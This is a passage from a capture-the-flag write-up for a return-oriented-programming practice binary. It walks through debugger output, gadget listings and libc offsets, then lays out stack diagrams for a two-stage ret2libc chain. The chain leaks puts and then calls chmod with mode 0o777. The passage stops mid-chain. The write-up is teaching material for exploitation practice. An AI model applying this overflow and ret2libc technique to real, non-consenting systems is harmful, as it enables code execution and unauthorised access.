 RCX  0x7f2b30898297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x7fff7f3afc20 —▸ 0x405090 (stdout@@GLIBC_2.2.5) —▸ 0x7f2b309776a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 R8   0x56
 R9   0x2c
 R10  0x4005b3 ◂— 0x72616863747570 /* 'putchar' */
 R11  0x246
 R12  0x4011b0 (_start) ◂— endbr64 
 R13  0x7fff7f3afd70 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff7f3afc50 —▸ 0x7fff7f3afc80 ◂— 0
 RSP  0x7fff7f3afc00 ◂— 0
 RIP  0x40206d (challenge+233) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
 ► 0x40206d <challenge+233>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0x7fff7f3afc20 —▸ 0x405090 (stdout@@GLIBC_2.2.5) —▸ 0x7f2b309776a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
        nbytes: 0x1000
 
   0x402072 <challenge+238>    mov    dword ptr [rbp - 4], eax
   0x402075 <challenge+241>    mov    eax, dword ptr [rbp - 4]
   0x402078 <challenge+244>    cdqe   
   0x40207a <challenge+246>    lea    rcx, [rbp - 0x30]
   0x40207e <challenge+250>    mov    rdx, qword ptr [rip + 0x3053]     RDX, [rp_]
   0x402085 <challenge+257>    sub    rcx, rdx
   0x402088 <challenge+260>    mov    rdx, rcx
   0x40208b <challenge+263>    add    rax, rdx
   0x40208e <challenge+266>    shr    rax, 3
   0x402092 <challenge+270>    mov    rdx, rax
──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fff7f3afc00 ◂— 0
01:0008│-048     0x7fff7f3afc08 —▸ 0x7fff7f3afd88 —▸ 0x7fff7f3b1691 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-040     0x7fff7f3afc10 —▸ 0x7fff7f3afd78 —▸ 0x7fff7f3b1675 ◂— '/challenge/putsception-easy'
03:0018│-038     0x7fff7f3afc18 ◂— 0x10000000a /* '\n' */
04:0020│ rax rsi 0x7fff7f3afc20 —▸ 0x405090 (stdout@@GLIBC_2.2.5) —▸ 0x7f2b309776a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0028│-028     0x7fff7f3afc28 —▸ 0x7f2b30810302 (putchar+130) ◂— mov r8d, eax
06:0030│-020     0x7fff7f3afc30 ◂— 0
07:0038│-018     0x7fff7f3afc38 —▸ 0x4021c0 (__libc_csu_init) ◂— endbr64 
────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40206d challenge+233
   1         0x4021aa main+165
   2   0x7f2b307ae083 __libc_start_main+243
   3         0x4011de _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Offset between buffer and stored return address to `main()`
   - Location of the buffer: `0x7fff7f3afc20`
- [x] Location of the PLT entry of `puts@plt`: `0x401110`
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4011b0`

Let's get the location of the stored return address and calculate the offset.

```
pwndbg> info frame
Stack level 0, frame at 0x7fff7f3afc60:
 rip = 0x40206d in challenge; saved rip = 0x4021aa
 called by frame at 0x7fff7f3afc90
 Arglist at 0x7fff7f3afc50, args: 
 Locals at 0x7fff7f3afc50, Previous frame's sp is 0x7fff7f3afc60
 Saved registers:
  rbp at 0x7fff7f3afc50, rip at 0x7fff7f3afc58
```

```
pwndbg> p/d 0x7fff7f3afc58 - 0x7fff7f3afc20
$1: 56
```

- [x] Offset between buffer and stored return address to `main()`: `56`
   - Location of the buffer: `0x7fff7f3afc20`
   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
- [x] Location of the PLT entry of `puts@plt`: `0x401110`
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4011b0`

Let's find a relevant NULL terminated string.

```
hacker@return-oriented-programming~putsception-easy:/$ objdump -s -j .rodata /challenge/putsception-easy | grep -E "[0-9a-f]{2}00"
 403000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
 403050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
 403070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
 403090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
 4030e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
 403100 6c657220 6661696c 65642074 6f20696e  ler failed to in
 403110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
 403120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
 403140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
 403150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
 403160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
 403190 61742025 702e0a00 54686973 20636861  at %p...This cha
 403200 20746869 73207365 72696573 206f6600   this series of.
 403270 00000000 00000000 54686973 20636861  ........This cha
 4032c0 65207265 736f7572 63656675 6c2e0000  e resourceful...
 403300 206c6962 632e0000 496e206f 72646572   libc...In order
 403340 20697420 796f7572 73656c66 2e000000   it yourself....
 403390 00000000 00000000 54686520 6f757465  ........The oute
 4033e0 6174696e 67206120 6c65616b 2e000000  ating a leak....
 403400 20697320 70757473 40676f74 3a207468   is puts@got: th
 403430 696e206c 6962632e 00000000 00000000  in libc.........
 403490 20746861 74206c65 616b2e00 00000000   that leak......
 4034f0 6f696e74 2e000000 52656365 69766564  oint....Received
 403500 20256420 62797465 73212054 68697320   %d bytes! This 
 403520 64206761 64676574 732e0a00 00000000  d gadgets.......
 403590 626c6500 00000000 66726f6d 20776974  ble.....from wit
 4035d0 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
 4035e0 67210023 23230023 23232057 656c636f  g!.###.### Welco
 4035f0 6d652074 6f202573 210a0023 23232047  me to %s!..### G
 403600 6f6f6462 79652100                    oodbye!.  
```

- [x] Offset between buffer and stored return address to `main()`: `56`
   - Location of the buffer: `0x7fff7f3afc20`
   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
- [x] Location of the PLT entry of `puts@plt`: `0x401110`
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [x] Location of a NULL terminated string: `0x403606`
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4011b0`

#### ROP gadgets

```
hacker@return-oriented-programming~putsception-easy:/$ ROPgadget --binary /challenge/putsception-easy 
Gadgets information
============================================================
0x0000000000401687 : adc eax, 0xc9fffffb ; ret
0x00000000004011dd : add ah, dh ; nop ; endbr64 ; ret
0x0000000000401487 : add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x000000000040120b : add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401fd4 : add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000402084 : add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040156f : add byte ptr [rax - 0x39], cl ; clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x0000000000401504 : add byte ptr [rax - 0x77], cl ; iretd
0x0000000000401502 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; iretd
0x00000000004012f2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x000000000040222c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x00000000004012f4 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401574 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x000000000040163f : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bd : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x00000000004021b7 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000004021b8 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040127a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040222e : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011dc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004012f6 : add byte ptr [rax], al ; jmp 0x401470
0x0000000000401576 : add byte ptr [rax], al ; jmp 0x401608
0x0000000000401641 : add byte ptr [rax], al ; jmp 0x40166f
0x00000000004016bf : add byte ptr [rax], al ; jmp 0x4016e6
0x00000000004021b9 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040127b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401279 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011db : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004021ba : add cl, cl ; ret
0x000000000040120a : add dil, dil ; loopne 0x401275 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040127c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012ef : add eax, 0x3db8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401277 : add eax, 0x3e2b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000402091 : add ecx, dword ptr [rax - 0x77] ; ret 0x458b
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004016f7 : call qword ptr [rax + 0xff3c3c9]
0x000000000040148c : call qword ptr [rax - 0x179a72b8]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401573 : clc ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401608
0x00000000004016bc : cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x0000000000401293 : cli ; jmp 0x401220
0x00000000004011e3 : cli ; ret
0x000000000040223b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004012f1 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401489 : cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x000000000040168a : dec ecx ; ret
0x0000000000401290 : endbr64 ; jmp 0x401220
0x00000000004011e0 : endbr64 ; ret
0x000000000040220c : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040163e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004011de : hlt ; nop ; endbr64 ; ret
0x00000000004016b9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x000000000040163b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004013dd : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401205 : je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401247 : je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401294 : jmp 0x401220
0x00000000004012f8 : jmp 0x401470
0x0000000000401578 : jmp 0x401608
0x0000000000401643 : jmp 0x40166f
0x0000000000401629 : jmp 0x401675
0x00000000004014cf : jmp 0x40168b
0x00000000004016c1 : jmp 0x4016e6
0x000000000040100b : jmp 0x4840104f
0x000000000040120c : jmp rax
0x000000000040148f : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040168b : leave ; ret
0x000000000040120d : loopne 0x401275 ; nop ; ret
0x0000000000401208 : mov byte ptr [rax + 0x40], dl ; add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401276 : mov byte ptr [rip + 0x3e2b], 1 ; pop rbp ; ret
0x000000000040163c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x40166f
0x00000000004016ba : mov dword ptr [rbp - 4], 0 ; jmp 0x4016e6
0x0000000000401571 : mov dword ptr [rbp - 8], 0 ; jmp 0x401608
0x00000000004021b6 : mov eax, 0 ; leave ; ret
0x0000000000401207 : mov edi, 0x405088 ; jmp rax
0x0000000000401570 : mov qword ptr [rbp - 8], 0 ; jmp 0x401608
0x00000000004011df : nop ; endbr64 ; ret
0x00000000004016f8 : nop ; leave ; ret
0x0000000000401f7a : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401f7b : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401f7c : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401f7d : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401f7e : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401f7f : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401f80 : nop ; nop ; pop rbp ; ret
0x0000000000401f81 : nop ; pop rbp ; ret
0x000000000040120f : nop ; ret
0x000000000040128c : nop dword ptr [rax] ; endbr64 ; jmp 0x401220
0x0000000000401206 : or dword ptr [rdi + 0x405088], edi ; jmp rax
0x000000000040221c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401493 : pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040221e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401495 : pop r13 ; pop rbp ; ret
0x0000000000402220 : pop r14 ; pop r15 ; ret
0x0000000000402222 : pop r15 ; ret
0x000000000040221b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040221f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401496 : pop rbp ; pop rbp ; ret
0x000000000040127d : pop rbp ; ret
0x0000000000401492 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000402223 : pop rdi ; ret
0x0000000000402221 : pop rsi ; pop r15 ; ret
0x000000000040221d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401494 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000401209 : push rax ; add dil, dil ; loopne 0x401275 ; nop ; ret
0x0000000000402081 : push rbx ; xor byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040101a : ret
0x00000000004014ff : ret 0x40be
0x0000000000402094 : ret 0x458b
0x0000000000401fd7 : ret 0x8948
0x00000000004020e4 : ret 0x8b48
0x00000000004014af : ret 0x8be
0x000000000040208a : retf 0x148
0x00000000004020e1 : rol byte ptr [rcx], 0x89 ; ret 0x8b48
0x0000000000402087 : ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401484 : sbb byte ptr [rbx], 0 ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401485 : sbb eax, dword ptr [rax] ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401278 : sub edi, dword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040223d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040223c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401203 : test eax, eax ; je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401245 : test eax, eax ; je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x0000000000402082 : xor byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401fd2 : xor dword ptr [rax], eax ; add byte ptr [rax + 0x29], cl ; ret 0x8948

Unique gadgets found: 136
```

- [x] Offset between buffer and stored return address to `main()`: `56`
   - Location of the buffer: `0x7fff7f3afc20`
   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
- [x] Location of the PLT entry of `puts@plt`: `0x401110`
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [x] Location of a NULL terminated string: `0x403606`
- [ ] Offsets of required Libc functions
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x402223`
   - `pop rsi ; pop r15 ; ret`: `0x402221`
- [x] Address of `_start()`: `0x4011b0`

#### Libc functions

Lets find the offset of the relevant functions within Libc.

```
hacker@return-oriented-programming~putsception-easy:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "puts"
   195: 0000000000084420   476 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
   505: 0000000000124550  1268 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
   692: 0000000000126220   728 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
  1160: 0000000000082ce0   384 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
```

```
hacker@return-oriented-programming~putsception-easy:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
```

- [x] Offset between buffer and stored return address to `main()`: `56`
   - Location of the buffer: `0x7fff7f3afc20`
   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
- [x] Location of the PLT entry of `puts@plt`: `0x401110`
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [x] Location of a NULL terminated string: `0x403606`
- [x] Offsets of required Libc functions
   - Offset of the `puts` symbol within Libc: `0x84420`
   - Offset of the `chmod` symbol within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x402223`
   - `pop rsi ; pop r15 ; ret`: `0x402221`
- [x] Address of `_start()`: `0x4011b0`

### ROP chain: ret2libc

#### Stage 1: Leaking the address of `puts` within Libc

In the first invocation, we leak the address of `puts` in Libc.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7fff7f3afc20 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc50 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7fff7f3afc58 │  00 00 00 00 00 40 22 23  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc60 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc68 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc60 │  00 00 00 00 00 40 50 28  │ --> ( puts@got )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc68 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc68 │  00 00 00 00 00 40 11 10  │ --> ( puts@plt )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x405028

Function call setup:
puts(*puts@got)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x405028

Function call setup:
puts(*puts@got)

═══════════════════════════════════════════════════════════════════════════════════
rip --> puts(*puts@got)
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc70 │  00 00 00 00 00 40 11 b0  │ --> ( _start() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x405028

Function call setup:
puts(*puts@got)

═══════════════════════════════════════════════════════════════════════════════════
rip --> puts(*puts@got) return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc78 │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> _start()
═══════════════════════════════════════════════════════════════════════════════════
```

We would have the address of `puts` within Libc by the end of this first stage, from which we can calculate the base address of Libc and the address of `chmod` within Libc.
The call to `_start()` would restart the challenge, and give us a chance to execute the second stage.

#### Stage 2: Using leaked Libc puts address to calculate Libc chmod address

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7fff7f3afc20 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc50 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7fff7f3afc58 │  00 00 00 00 00 40 22 23  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc60 │  00 00 00 00 00 40 36 06  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc68 │  00 00 00 00 00 40 22 21  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc70 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc60 │  00 00 00 00 00 40 36 06  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc68 │  00 00 00 00 00 40 22 21  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc70 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc68 │  00 00 00 00 00 40 22 21  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc70 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403606

Function call setup:
chmod("!")

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc70 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403606

Function call setup:
chmod("!")

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsi ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc78 │  42 42 42 42 42 42 42 42  │ --> ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403606
rsi: 0x1ff

Function call setup:
chmod("!", 0o777)

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7fff7f3afc80 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403606
rsi: 0x1ff
r15: b"BBBBBBBB"

